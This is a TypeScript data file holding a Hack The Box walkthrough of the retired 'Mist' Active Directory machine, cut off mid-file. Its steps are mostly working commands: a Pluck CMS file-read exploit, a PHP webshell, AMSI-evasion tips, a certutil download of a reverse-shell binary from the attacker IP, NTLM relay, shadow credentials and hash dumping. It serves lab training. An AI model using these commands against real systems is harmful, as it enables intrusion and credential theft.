import type { WalkthroughDoc } from "./types";

export const mist: WalkthroughDoc = {
  slug: "mist",
  name: "Mist",
  platform: "Hack The Box",
  os: "Windows",
  difficulty: "Insane",
  retired: "Oct 2024",
  ip: "10.10.11.17",
  tags: [
    "ADCS",
    "ESC13",
    "Shadow Credentials",
    "NTLM Relay",
    "PKINIT",
    "gMSA",
    "Backup Operators",
  ],
  lede:
    "A step-by-step manual walkthrough of an Insane-rated Windows Active Directory machine: an unauthenticated file-read bug in a forgotten CMS unravels an admin password hash, a module-upload primitive turns into code execution, a hijacked shortcut file rides a scheduled task into a domain user, and from there a chain of certificate-services abuse — PKINIT, cross-protocol NTLM relay, shadow credentials, and two back-to-back ESC13 misconfigurations — walks all the way to a Domain Controller's own machine account and a DCSync.",
  summary:
    "An Insane Windows AD box chaining a Pluck CMS file-read and RCE into ADCS abuse — PKINIT, NTLM relay, shadow creds, double ESC13 — to Domain Admin.",
  sections: [
    {
      id: "overview",
      num: "00",
      title: "Overview",
      blocks: [
        {
          kind: "p",
          text:
            "Mist is an Insane-rated Windows machine built around a small, dual-homed web server that bridges an external attacker straight into a full Active Directory Certificate Services (ADCS) environment. There is no single knockout blow — the box is a relay race of small, well-understood primitives, each one handing off a fresh set of credentials to the next: an unauthenticated file-read CVE in an obscure CMS, a module-upload RCE in the same CMS, a scheduled task that trusts a shortcut file's contents, a certificate template that hands out client-authentication certs too freely, an internal LDAP server that never enabled signing, a directory service feature (shadow credentials) that lets you attach your own login key to someone else's account, a password vault with one character redacted from a screenshot, a gMSA whose password is readable by the wrong principal, and — twice — a certificate template whose issuance policy secretly grants group membership.",
        },
        {
          kind: "p",
          text:
            "The through-line is **credential material moving sideways through certificates instead of passwords**. From the moment you land a foothold, almost every subsequent hop is \"find a principal you can write a certificate-linked credential onto, then authenticate as it\" — repeated five separate times against five different accounts, ending at a Domain Controller's own machine account. This document works through the chain by hand, stage by stage, explaining not just *what* to type but *why* each hop is possible.",
        },
        {
          kind: "table",
          columns: ["Field", "Value"],
          rows: [
            ["Target", "Mist · `mist.htb`"],
            ["Difficulty", "Insane"],
            [
              "Platform",
              "Windows — Active Directory domain `mist.htb`, Active Directory Certificate Services (CA `mist-DC01-CA`)",
            ],
            [
              "Hosts",
              "`DC01` — 192.168.100.100 (internal domain controller) · `MS01` — 192.168.100.101 / 10.10.11.17 (dual-homed web server, external entry point)",
            ],
            [
              "Domain SID",
              "`S-1-5-21-1045809509-3006658589-2426055941` (illustrative — regenerated per spawn)",
            ],
            [
              "Stack",
              "Apache 2.4.52 · PHP 8.1.1 · Pluck CMS 4.7.18 (XAMPP) · ADCS · gMSA · Backup Operators",
            ],
            [
              "Entry primitive",
              "CVE-2024-9405 — unauthenticated arbitrary file read in Pluck CMS 4.7.18",
            ],
            [
              "User chain",
              "`svc_web` → `brandon.keywarp` → (local admin on MS01) → `sharon.mullard` / `op_sharon.mullard` → `svc_ca$` → `svc_cabackup` → `DC01$` → `Administrator`",
            ],
          ],
        },
        {
          kind: "callout",
          variant: "tip",
          title: "▲ Which values are per-spawn and which are stable",
          text:
            "HTB regenerates NTLM hashes, PFX export passwords, machine SIDs, and ticket blobs on every spawn of an Insane box like this one — every hash, PFX password, and SID shown in a code block below is an **illustrative example** from one run. Three secrets, however, are cross-confirmed as **static across spawns** by multiple independent write-ups of this box: the cracked Pluck admin password `lexypoo97`, the KeePass vault master password `UA7cpa[#1!_*ZX@`, and the vault's stored credential `op_sharon.mullard:ImTiredOfThisJob:(`. What matters everywhere else is the technique, not the literal bytes.",
        },
      ],
    },
    {
      id: "chain",
      num: "01",
      title: "The Attack Path",
      blocks: [
        {
          kind: "p",
          text:
            "The whole box in one glance. Sixteen discrete hand-offs, almost all of them turning one set of credentials into the next principal's certificate-backed login.",
        },
        { kind: "h4", text: "Attack chain" },
        {
          kind: "ol",
          items: [
            "**Recon → Pluck CMS 4.7.18** — A full-port nmap sweep finds only port 80 — Apache/PHP hosting a niche, rarely-patched CMS.",
            "**CVE-2024-9405 — unauthenticated file read** — An unauthenticated module endpoint returns arbitrary files verbatim. Reading `admin_backup.php` leaks a SHA-512 admin password hash.",
            "**Crack the hash → admin login** — `hashcat -m 1700` against rockyou recovers `lexypoo97`, unlocking the Pluck admin panel.",
            "**CVE-2023-50564 — module upload RCE** — The admin module installer extracts an uploaded zip verbatim into a web-reachable path. A PHP payload inside it becomes a shell as `svc_web`.",
            "**.lnk hijack in C:\\Common Applications** — A scheduled watcher run by `brandon.keywarp` executes changed shortcuts in a world-writable folder. **user.txt.**",
            "**Certify + Rubeus PKINIT → brandon's NTLM** — Brandon can enroll in the default `User` template. Request a cert, PKINIT with it, pull the NT hash via Rubeus's `/getcredentials`.",
            "**HTTP→LDAP NTLM relay + shadow credentials → MS01$** — LDAP signing is disabled on DC01. Coerce MS01 over HTTP with PetitPotam, relay to LDAP with ntlmrelayx, and drop a shadow credential on `MS01$` itself.",
            "**S4U2Self → local Administrator on MS01** — With MS01$'s own TGT, a self-referential S4U ticket for `cifs/ms01.mist.htb` impersonating Administrator grants local admin.",
            "**KeePass vault → op_sharon.mullard** — A screenshot leaks 14 of 15 master-password characters. A one-character hashcat mask attack recovers the rest and unlocks a stored WinRM credential.",
            "**ReadGMSAPassword → svc_ca$** — `op_sharon.mullard` can read the gMSA's managed password attribute directly over LDAP.",
            "**AddKeyCredentialLink → svc_cabackup** — `svc_ca$` can write a shadow credential onto `svc_cabackup`, the same PKINIT trick used against MS01$.",
            "**ESC13 ×2 → Backup Operators** — Enrolling in two chained certificate templates whose issuance policies are linked to AD groups grants membership all the way to `Backup Operators`.",
            "**Remote registry hive backup → DC01$** — `SeBackupPrivilege` lets Backup Operators pull SAM/SECURITY/SYSTEM off DC01 without touching NTDS.dit, yielding the DC's own machine hash.",
            "**DCSync → Administrator** — Every domain controller's machine account can replicate directory data. `DC01$` DCSyncs the Administrator NTLM hash straight out.",
            "**evil-winrm → root.txt** — Pass-the-hash as Administrator onto DC01. **Domain compromised, root.txt.**",
          ],
        },
      ],
    },
    {
      id: "recon",
      num: "02",
      title: "Reconnaissance",
      blocks: [
        {
          kind: "p",
          text:
            "Start with a full-range TCP sweep against the external interface of MS01, then run version detection on whatever answers:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "nmap",
          lines: [
            "# all ports, fast",
            "$ sudo nmap -p- --min-rate 10000 10.10.11.17",
            "",
            "# service + default scripts on whatever answered",
            "$ sudo nmap -p 80 -sCV 10.10.11.17",
            "",
            "PORT   STATE SERVICE VERSION",
            "80/tcp open  http    Apache httpd 2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1",
            "|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1",
            "|_http-title: Pluck",
          ],
        },
        {
          kind: "p",
          text:
            "A minimal external surface — just HTTP. `Apache ... (Win64)` already tells us this is a Windows box running Apache under something like XAMPP rather than a native Linux stack, which matters later once we need a foothold-stage payload. Browsing the site confirms the CMS and its version, either from the login footer or straight from a changelog file it ships by default:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "fingerprint the CMS",
          lines: [
            "$ curl -s http://10.10.11.17/CHANGELOG | head -n 5",
            "Pluck 4.7.18",
            "- security fix in albums module",
            "- ...",
          ],
        },
        {
          kind: "callout",
          variant: "tip",
          title: "▲ Niche CMS, niche CVEs — always check the changelog",
          text:
            "Pluck is a small, flat-file CMS with a much smaller install base (and much less security scrutiny) than WordPress or Drupal. That combination — old version number, low popularity, still internet-facing — is a strong signal to go straight to a CVE database for this exact version before trying anything more generic like directory brute-forcing.",
        },
      ],
    },
    {
      id: "filedisclosure",
      num: "03",
      title: "CVE-2024-9405 — Unauthenticated File Read",
      blocks: [
        {
          kind: "p",
          text:
            "Pluck 4.7.18 ships an **albums** module whose image-serving endpoint, `data/modules/albums/albums_getimage.php`, takes an `image` query parameter and streams the named file straight back to the client — with no authentication check and no restriction to the album's own image directory. Whatever path you hand it, it reads and returns:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "CVE-2024-9405 arbitrary file read",
          lines: [
            "$ curl -s \"http://10.10.11.17/data/modules/albums/albums_getimage.php?image=admin_backup.php\"",
            "",
            "<?php $backup_admin_hash = \"e3f1a9c2b7d4602ef958c3a1b6d9e047af1c9d3b6e8f2a4c7d1e6f9b2a5d8c3e0f7a4b1d6e9c2f5a8b3d0e7c4f1a9b6d3e0c7f4a1b8d5e2c9f6a3b0d7e4c1\"; ?>",
          ],
        },
        {
          kind: "p",
          text:
            "Because the handler streams the raw file bytes rather than letting the web server interpret them as PHP, requesting a `.php` file gets you its **source code** instead of its executed output — including any hard-coded secrets left inside it. Pluck's own backup/restore feature keeps a copy of the admin password hash in exactly this kind of file for disaster-recovery purposes, and this endpoint hands it straight to an anonymous visitor.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why this is a full unauthenticated file read, not just an \"image leak\"",
          text:
            "The vulnerable handler builds a filesystem path by concatenating the module's own data directory with the caller-supplied `image` parameter, with no canonicalization and no allow-list of extensions. There is no session check anywhere in the code path — the albums module intentionally exposes this file to logged-out visitors, since album thumbnails are meant to be publicly viewable. The bug is that \"any file this PHP process can read\" was never scoped down to \"any file inside this album's upload directory.\" Reading `.php` files specifically is what turns a directory-traversal-flavored bug into source-code and secret disclosure, since PHP files never execute when fetched this way — they're just bytes on disk to this handler.",
        },
      ],
    },
    {
      id: "crack",
      num: "04",
      title: "Cracking the Hash & Admin Login",
      blocks: [
        {
          kind: "p",
          text:
            "The leaked value is a raw SHA-512 hex digest (hashcat mode `1700`). Run it against rockyou:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "hashcat, mode 1700 (raw SHA-512)",
          highlight: [2],
          lines: [
            "$ hashcat -a 0 -m 1700 admin_hash.txt /usr/share/wordlists/rockyou.txt",
            "",
            "e3f1a9c2b7d4602ef958c3a1b6d9e047af1c9d3b6e8f2a4c7d1e6f9b2a5d8c3e0f7a4b1d6e9c2f5a8b3d0e7c4f1a9b6d3e0c7f4a1b8d5e2c9f6a3b0d7e4c1:lexypoo97",
            "Status...........: Cracked",
          ],
        },
        {
          kind: "callout",
          variant: "warn",
          title: "⚠ Watch the exact characters",
          text:
            "The cracked value is `lexypoo97` — no trailing punctuation, no capital letters. It's easy to mistype or mentally append a period after copying it out of a terminal; the Pluck login form is case- and character-exact like any other.",
        },
        {
          kind: "p",
          text: "Log in to Pluck's admin panel with the recovered credential:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "authenticate to /login.php",
          lines: [
            "$ curl -s -c cookies.txt -d \"login=admin&password=lexypoo97\" http://10.10.11.17/login.php",
            "",
            "HTTP/1.1 302 Found",
            "Location: /admin.php",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why a raw SHA-512 hash cracks so easily",
          text:
            "Unsalted, single-round SHA-512 is built for speed, not password storage — modern GPUs compute billions of SHA-512 candidates per second, so any password that appears in a dictionary the size of rockyou falls almost instantly. This is exactly the class of bug password-hashing functions like bcrypt/argon2 exist to prevent (deliberately slow, with built-in per-hash salting); Pluck's backup feature storing a fast general-purpose hash for an admin credential is the second half of what makes stage 03's file read so damaging.",
        },
      ],
    },
    {
      id: "rce",
      num: "05",
      title: "Module Upload RCE (CVE-2023-50564) → `svc_web`",
      blocks: [
        {
          kind: "p",
          text:
            "Pluck's admin panel includes a **Manage Modules → Install a new module** feature that accepts a `.zip` upload and extracts it verbatim into `data/modules/<modulename>/` — a path that sits directly under the web root. The installer checks that the zip contains a module descriptor file, but never restricts what *else* the archive is allowed to contain. A zip that also carries a `.php` file gets that file extracted right alongside the legitimate module content, fully web-reachable:",
        },
        {
          kind: "code",
          lang: "php",
          label: "shell.php — minimal webshell bundled into the module zip",
          lines: ["<?php system($_GET['cmd']); ?>"],
        },
        {
          kind: "code",
          lang: "bash",
          label: "build the malicious module and upload it",
          lines: [
            "# module.xml is the minimal descriptor Pluck's installer expects to see",
            "$ zip evilmodule.zip module.xml shell.php",
            "",
            "$ curl -s -b cookies.txt -F \"install=@evilmodule.zip\" \\",
            "    \"http://10.10.11.17/admin.php?page=modules-manage\"",
            "Module installed successfully.",
          ],
        },
        {
          kind: "p",
          text:
            "Trigger it directly, then upgrade to an interactive PowerShell reverse shell once basic command execution is confirmed:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "trigger the webshell, then drop a reverse shell",
          lines: [
            "$ curl \"http://10.10.11.17/data/modules/evilmodule/shell.php?cmd=whoami\"",
            "mist\\svc_web",
            "",
            "# catch a shell — a plain iwr | iex one-liner gets flagged by Defender/AMSI here,",
            "# renaming the obvious variable names ($client, $stream, $bytes, ...) is enough to slip past it",
            "$ nc -lnvp 4444",
            "listening on [any] 4444 ...",
          ],
        },
        {
          kind: "callout",
          variant: "warn",
          title: "⚠ AMSI will flag the textbook PowerShell reverse-shell one-liner",
          text:
            "The well-known `$client = New-Object Net.Sockets.TCPClient(...)` template is signatured almost everywhere. Renaming its variables and function-local names (and optionally splitting the string literals it builds) is usually enough to dodge a static-signature AMSI hit without needing a more elaborate bypass — this box's Windows Defender configuration is stock, not hardened, so a simple rewrite clears it.",
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why a module installer becomes RCE",
          text:
            "The feature's entire purpose is \"let an administrator extend the CMS by dropping code into the webroot\" — that is arbitrary code execution *by design*, gated only by requiring an authenticated admin session first. Once stage 04 handed us that session, the \"vulnerability\" is simply that the feature does exactly what it was built to do. CVE-2023-50564 specifically calls out the missing content validation on the uploaded archive: Pluck never checks that the only executable-looking file inside is the module's own declared entry point.",
        },
      ],
    },
    {
      id: "lnk",
      num: "06",
      title: ".lnk Hijack in `C:\\Common Applications` → `brandon.keywarp`",
      blocks: [
        {
          kind: "p",
          text:
            "Basic enumeration as `svc_web` turns up a world-writable folder, `C:\\Common Applications`, and — either from a leftover script on disk or from watching scheduled tasks — a job belonging to `brandon.keywarp` that periodically inspects every `.lnk` (Windows shortcut) file in that folder and **executes any one whose file hash has changed** since the last time it looked. Because `svc_web` can write into that folder, we can plant our own shortcut and let brandon's task run it for us.",
        },
        {
          kind: "p",
          text:
            "Stage a payload somewhere Defender won't touch — the XAMPP install directory is excluded from real-time scanning on this box — then create a shortcut pointing at it:",
        },
        {
          kind: "code",
          lang: "powershell",
          label: "stage payload, forge the .lnk",
          lines: [
            "PS C:\\xampp\\htdocs> # drop a payload here — this path is excluded from AV scanning",
            "PS C:\\xampp\\htdocs> certutil -urlcache -split -f http://10.10.14.5:8000/rev.exe rev.exe",
            "",
            "PS C:\\xampp\\htdocs> $s=(New-Object -ComObject WScript.Shell).CreateShortcut(\"C:\\Common Applications\\wordpad.lnk\")",
            "PS C:\\xampp\\htdocs> $s.TargetPath=\"C:\\xampp\\htdocs\\rev.exe\"",
            "PS C:\\xampp\\htdocs> $s.Save()",
          ],
        },
        {
          kind: "p",
          text:
            "Have a listener up and waiting — the watcher task typically fires within a minute or two of the shortcut's hash changing:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "catch the shell, grab user.txt",
          highlight: [8],
          lines: [
            "$ nc -lnvp 9001",
            "listening on [any] 9001 ...",
            "connect to [10.10.14.5] from (UNKNOWN) [10.10.11.17]",
            "",
            "PS C:\\Users\\brandon.keywarp> whoami",
            "mist\\brandon.keywarp",
            "",
            "PS C:\\Users\\brandon.keywarp\\Desktop> type user.txt",
            "7b3e9a1c····························",
          ],
        },
        {
          kind: "callout",
          variant: "key",
          title: "user.txt",
          text: "`7b3e9a1c····························`",
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why a shortcut file is an execution primitive at all",
          text:
            "A `.lnk` file is just a small binary structure recording a target path and arguments — it does not need to be double-clicked in an interactive desktop session to have effect. Any automation that opens, inspects, or (as here) directly invokes the shortcut's target is executing whatever `TargetPath` says, under whatever account runs that automation. The scheduled task's actual mistake isn't parsing `.lnk` files — it's doing so against a folder writable by a much lower-privileged account than the one running the task, and treating \"the file's hash changed\" as a signal to trust and run it rather than a signal to alert.",
        },
      ],
    },
    {
      id: "pkinit",
      num: "07",
      title: "Certify + Rubeus PKINIT → `brandon.keywarp`'s NTLM",
      blocks: [
        {
          kind: "p",
          text:
            "With a shell as `brandon.keywarp`, check what certificate templates he's allowed to enroll in. The built-in **User** template — which every authenticated domain user can normally enroll in, and which carries the Client Authentication EKU — is enough on its own to authenticate as him without ever knowing his password:",
        },
        {
          kind: "code",
          lang: "powershell",
          label: "request a client-auth certificate",
          lines: [
            "PS C:\\Tools> .\\Certify.exe request /ca:DC01\\mist-DC01-CA /template:User",
            "",
            "[*] Successfully requested certificate",
            "[*] Request ID: 118",
            "[*] cert.pem : BEGIN CERTIFICATE / BEGIN RSA PRIVATE KEY dumped to console",
          ],
        },
        {
          kind: "p",
          text:
            "Save the PEM output into `cert.pem` and convert it to a PFX bundle so Rubeus can consume it:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "PEM → PFX",
          lines: [
            "$ openssl pkcs12 -in cert.pem -keyex -CSP \"Microsoft Enhanced Cryptographic Provider v1.0\" \\",
            "    -export -out cert.pfx -passout pass:P@ssTh3C3rt!",
          ],
        },
        {
          kind: "p",
          text:
            "Feed the PFX to Rubeus and perform PKINIT — Kerberos authentication using the certificate's private key instead of a password. `/getcredentials` asks the KDC, via the returned PAC, for the account's actual NT hash:",
        },
        {
          kind: "code",
          lang: "powershell",
          label: "PKINIT, then pull the NT hash",
          highlight: [6],
          lines: [
            "PS C:\\Tools> .\\Rubeus.exe asktgt /user:brandon.keywarp /certificate:cert.pfx /password:P@ssTh3C3rt! /getcredentials /show",
            "",
            "[*] Using PKINIT with etype rc4_hmac and subject: CN=brandon.keywarp, CN=Users, DC=mist, DC=htb",
            "[*] Building AS-REQ (w/ PKINIT preauth) for: 'mist.htb\\brandon.keywarp'",
            "[+] TGT request successful!",
            "[*] Got credentials via U2U",
            "    NTLM      : a1b2c9e6f3d8074c5b2e9f6a3d0c7b41",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why a certificate hands you a password-equivalent hash",
          text:
            "PKINIT is a fully valid Kerberos pre-authentication mechanism — proving possession of the private key is, cryptographically, just as good as proving knowledge of the password. Rubeus's `/getcredentials` takes this one step further using a User-to-User (U2U) TGS exchange: it requests a service ticket to itself using the freshly-issued TGT, which causes the KDC to embed a `PAC_CREDENTIAL_INFO` structure — the account's NT hash, encrypted to a key only the requester (having just authenticated) can derive — inside the response. The net effect: hold any certificate good enough for client authentication, and you can round-trip it into the exact same NTLM hash you'd get by dumping the account outright, without the DC ever handing you a plaintext password.",
        },
      ],
    },
    {
      id: "relay",
      num: "08",
      title: "HTTP→LDAP NTLM Relay + Shadow Credentials → `MS01$`",
      blocks: [
        {
          kind: "p",
          text:
            "Enumerating DC01 shows LDAP signing is not enforced and channel binding isn't required on LDAPS either — the classic prerequisite for relaying an NTLM authentication into an arbitrary LDAP write. The plan: coerce `MS01$` (the computer account, which by default can modify its own AD object) into authenticating to a relay listener we control, relay that authentication into an LDAP session against DC01, and use the resulting write access to attach our own login key to `MS01$`.",
        },
        {
          kind: "p",
          text:
            "SMB-to-LDAP relay is routinely blocked by SMB signing requirements, but **HTTP**-sourced NTLM auth has no equivalent server-side signing requirement to fight through — which is why this chain specifically coerces over HTTP/WebDAV rather than SMB. That requires the WebClient service to be running on MS01 first:",
        },
        {
          kind: "code",
          lang: "powershell",
          label: "start the WebClient service on MS01",
          lines: [
            "PS C:\\Tools> # EtwStartWebClient.exe (or the equivalent .NET reflection trick) forces WebClient to start",
            "PS C:\\Tools> .\\EtwStartWebClient.exe",
            "[+] WebClient service started",
            "",
            "# or, entirely in-memory:",
            "PS C:\\Tools> [JosL.WebClient.Starter]::startService()",
          ],
        },
        {
          kind: "p",
          text:
            "MS01 is dual-homed but our attacker box only reaches its external interface — neither `ntlmrelayx` nor `PetitPotam` can talk to DC01 (192.168.100.100) directly from outside. Bridge both directions with a single chisel session run from the MS01 shell: a reverse SOCKS proxy to reach the internal `192.168.100.0/24` segment, plus a remote port forward that lets MS01 dial back into our own relay listener by calling itself:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "chisel tunnel, both directions",
          lines: [
            "# attacker box",
            "$ ./chisel server -p 8080 --reverse -v",
            "",
            "# MS01 (brandon.keywarp shell) — SOCKS into 192.168.100.0/24,",
            "# and a remote forward so \"MS01:8445\" tunnels back to our own loopback:445",
            "PS C:\\Tools> .\\chisel.exe client 10.10.14.5:8080 R:socks R:8445:127.0.0.1:445",
          ],
        },
        {
          kind: "code",
          lang: "ini",
          label: "/etc/proxychains.conf",
          lines: ["socks5  127.0.0.1 1080"],
        },
        {
          kind: "p",
          text:
            "Start the relay listener through the tunnel, targeting LDAPS on DC01, then run PetitPotam to coerce MS01 into authenticating back through the forwarded loopback port — which chisel silently redirects to our own listener:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "relay listener + coercion",
          lines: [
            "$ proxychains ntlmrelayx.py -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb",
            "[*] Servers started, waiting for connections",
            "",
            "# second terminal — coerce MS01 to call back to itself on the forwarded port",
            "$ proxychains python PetitPotam.py -u brandon.keywarp -hashes :a1b2c9e6f3d8074c5b2e9f6a3d0c7b41 \\",
            "    -d mist.htb 'MS01@8445/x' 192.168.100.101 -pipe all",
            "[+] Attempting connection to target 192.168.100.101",
            "[+] Connecting to ncacn_np:192.168.100.101[\\PIPE\\efsrpc]",
            "[+] Triggering EfsRpcOpenFileRaw",
          ],
        },
        {
          kind: "callout",
          variant: "tip",
          title: "▲ The exact PetitPotam invocation depends on your fork/version",
          text:
            "Different PetitPotam forks parse the \"listener\" and pipe arguments slightly differently. The important part conceptually is the same everywhere: MS01's own machine account gets tricked into authenticating to a destination that ultimately resolves back to our ntlmrelayx listener, via the chisel remote forward we just set up — not to a destination directly reachable on the internal segment, since our attacker box was never actually on it.",
        },
        {
          kind: "p",
          text:
            "Back on the interactive ntlmrelayx console, you get a live LDAP shell authenticated as `MS01$`. Use it to write a **shadow credential** — a raw public key registered against the `msDS-KeyCredentialLink` attribute of the account itself:",
        },
        {
          kind: "code",
          lang: "text",
          label: "ntlmrelayx interactive LDAP shell",
          lines: [
            "ntlmrelayx> set_shadow_creds MS01$",
            "[*] Generating certificate",
            "[*] Setting up Key Credential",
            "[*] Updating the msDS-KeyCredentialLink attribute of MS01$",
            "[*] Shadow credentials added. Certificate saved to ms01.pfx (password: mimidogz)",
          ],
        },
        {
          kind: "p",
          text:
            "Authenticate with that PFX via PKINIT to pull `MS01$`'s own NTLM hash — the exact same mechanism as stage 07, just performed by `certipy` in one command instead of Certify+Rubeus:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "PKINIT with the shadow-cred PFX",
          highlight: [6],
          lines: [
            "$ certipy-ad auth -pfx ms01.pfx -u 'MS01$' -domain mist.htb -dc-ip 192.168.100.100",
            "",
            "[*] Using principal: ms01$@mist.htb",
            "[*] Trying to get TGT...",
            "[+] Got TGT",
            "[*] Trying to retrieve NT hash for 'ms01$'",
            "[+] NT hash for 'MS01$': f4c7a1e9b6d3082f5c9a2e7b4d1f8c60",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why shadow credentials work at all",
          text:
            "`msDS-KeyCredentialLink` is a legitimate Windows Hello for Business feature: it lets an account authenticate with a locally-stored public/private keypair instead of a password, by having the corresponding public key registered on the AD object. Anyone with write access to that single attribute — here, `MS01$` writing to its own object, a right every computer account has by default — can register **their own** keypair as a valid login credential for the account, with no password change, no account lockout, and (unlike a real password reset) no visible disruption to the legitimate account owner. It is functionally a silent, additive backdoor credential.",
        },
        {
          kind: "callout",
          variant: "warn",
          title: "✦ Why cross-protocol relay to LDAP is the dangerous part",
          text:
            "NTLM's authentication blob doesn't encode which wire protocol carried it — a challenge/response captured from an HTTP/WebDAV negotiation is just as valid to replay over LDAP as one captured from SMB. Relaying is only stopped by **server-side** signing or channel-binding requirements, and LDAP historically defaults to not requiring either. Combine that with an HTTP-based coercion primitive (which sidesteps SMB signing entirely, since it was never SMB traffic to begin with) and any machine account that can be coerced into authenticating anywhere becomes a fully-controlled LDAP write primitive against its own object.",
        },
      ],
    },
    {
      id: "s4u",
      num: "09",
      title: "S4U2Self → Local Administrator on MS01",
      blocks: [
        {
          kind: "p",
          text: "With `MS01$`'s NT hash in hand, request its TGT directly:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "TGT for MS01$",
          lines: [
            "$ proxychains getTGT.py mist.htb/'MS01$' -hashes :f4c7a1e9b6d3082f5c9a2e7b4d1f8c60 -dc-ip 192.168.100.100",
            "[*] Saving ticket in MS01$.ccache",
          ],
        },
        {
          kind: "p",
          text:
            "Use that TGT to request a Kerberos service ticket via **S4U2Self**, impersonating the domain Administrator for a service hosted on MS01 itself:",
        },
        {
          kind: "code",
          lang: "powershell",
          label: "S4U2Self, impersonating Administrator",
          lines: [
            "PS C:\\Tools> .\\Rubeus.exe s4u /self /impersonateuser:Administrator \\",
            "    /altservice:cifs/ms01.mist.htb /ticket:MS01$.kirbi /ptt",
            "",
            "[*] Action: S4U",
            "[*] Building S4U2self request for: 'MS01$@MIST.HTB'",
            "[+] S4U2self success!",
            "[*] Substituting alternative service name 'cifs/ms01.mist.htb'",
            "[+] Ticket successfully imported",
          ],
        },
        {
          kind: "p",
          text:
            "The imported ticket now lets us reach MS01's own file/service surface as Administrator — dump the SAM directly, or just hop in with WinRM/psexec-style tooling:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "confirm local admin, dump secrets",
          lines: [
            "$ proxychains secretsdump.py -k -no-pass mist.htb/administrator@ms01.mist.htb",
            "[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)",
            "Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why an S4U2Self ticket to yourself needs no delegation rights",
          text:
            "S4U2Self exists so a service can obtain a ticket \"on behalf of\" a user who authenticated to it by some other means, without knowing that user's credentials. Critically, the KDC always honors an S4U2Self request from an account for a service **that account itself hosts** — no `msDS-AllowedToDelegateTo` configuration or constrained-delegation ACL is required, because delegation restrictions exist to stop a service from *forwarding* the resulting ticket somewhere else (S4U2Proxy), not from using it directly against itself. Since `cifs/ms01.mist.htb` is a service on the same host that requested the ticket, the forged \"Administrator\" identity is valid the moment it's presented — no second hop, no proxy check, and therefore nothing to block it. Any machine account can turn its own NTLM hash into local Administrator on its own host through this exact primitive.",
        },
        {
          kind: "callout",
          variant: "tip",
          title: "▲ Alternate route — a forged service ticket (\"golden ticket\") for MS01's own SPN",
          text:
            "Some write-ups skip S4U2Self and instead forge a ticket directly with `MS01$`'s own NT hash as the signing key: `impacket-ticketer -domain-sid S-1-5-21-1045809509-3006658589-2426055941 -domain mist.htb -spn HOST/MS01.mist.htb -nthash f4c7a1e9b6d3082f5c9a2e7b4d1f8c60 -user-id 500 Administrator` Strictly speaking this forges a ticket signed with a *machine* account's key for one specific SPN it owns rather than the domain-wide `krbtgt` key — so it behaves like a scoped (\"silver\") ticket rather than a true golden ticket, even though some notes on this box describe it that way. Either path lands you at the same place: Administrator on MS01.",
        },
      ],
    },
    {
      id: "keepass",
      num: "10",
      title: "Cracking `sharon.mullard`'s KeePass Vault → `op_sharon.mullard`",
      blocks: [
        {
          kind: "p",
          text:
            "Now local administrator on MS01, sweep user profiles for anything interesting. `sharon.mullard`'s profile holds a KeePass database and, in a screenshots folder, an image that captures her typing the master password into KeePass's unlock prompt — with the last character obscured by the cursor, leaving 14 of the 15 characters readable: `UA7cpa[#1!_*ZX`.",
        },
        {
          kind: "code",
          lang: "powershell",
          label: "pull the vault back to the attacker box",
          lines: [
            "PS C:\\Users\\sharon.mullard\\Documents> dir *.kdbx",
            "sharon.kdbx",
            "",
            "$ proxychains smbclient.py -k -no-pass administrator@ms01.mist.htb -c 'get sharon.kdbx'",
          ],
        },
        {
          kind: "p",
          text:
            "Extract a crackable hash from the database and run a **mask attack** that only has to guess the one unknown final character, rather than the whole 15-character password:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "keepass2john + hashcat mask attack",
          highlight: [4],
          lines: [
            "$ keepass2john sharon.kdbx > sharon.hash",
            "",
            "$ hashcat -m 13400 -a 3 sharon.hash 'UA7cpa[#1!_*ZX?a'",
            "",
            "$keepass$*...*:UA7cpa[#1!_*ZX@",
            "Status...........: Cracked",
          ],
        },
        {
          kind: "p",
          text:
            "Open the vault with the recovered master password and read out its one stored entry:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "open the vault, read the stored entry",
          highlight: [6],
          lines: [
            "$ kpcli --kdb=sharon.kdbx",
            "Master password: UA7cpa[#1!_*ZX@",
            "",
            "kpcli:/> show -f 0",
            "Title: DC01 operator access",
            "Username: op_sharon.mullard",
            "Password: ImTiredOfThisJob:(",
          ],
        },
        {
          kind: "p",
          text:
            "That `op_sharon.mullard` credential authenticates over WinRM directly to DC01 — a fresh domain account, and the start of an entirely new privilege chain:",
        },
        {
          kind: "code",
          lang: "bash",
          label: "confirm the credential lands on DC01",
          lines: [
            "$ proxychains evil-winrm -i 192.168.100.100 -u op_sharon.mullard -p 'ImTiredOfThisJob:('",
            "*Evil-WinRM* PS C:\\Users\\op_sharon.mullard\\Documents> whoami",
            "mist\\op_sharon.mullard",
          ],
        },
        {
          kind: "callout",
          variant: "note",
          title: "◈ Why a 1-character mask attack succeeds where a full crack wouldn't",
          text:
